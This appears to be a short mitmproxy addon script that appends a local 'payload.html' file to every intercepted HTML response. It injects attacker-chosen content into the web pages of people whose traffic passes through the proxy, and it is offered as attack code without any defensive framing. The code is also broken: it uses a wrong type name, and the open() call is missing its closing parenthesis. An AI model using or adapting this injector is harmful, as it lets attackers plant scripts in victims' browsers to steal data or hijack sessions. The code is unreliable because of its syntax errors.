from mitmproxy import http

def response(flow: httpFlow) -> None:
	if flow.response and flow.response.content:
		# The flow.response.content variable contains any website code
		# Any changes to that variable will be passed along to the browser
		if b"html" in flow.response.content:
			payload = open("payload.html", "r"
			flow.response.content += bytes(payload.read(), "UTF-8")
			payload.close()
		pass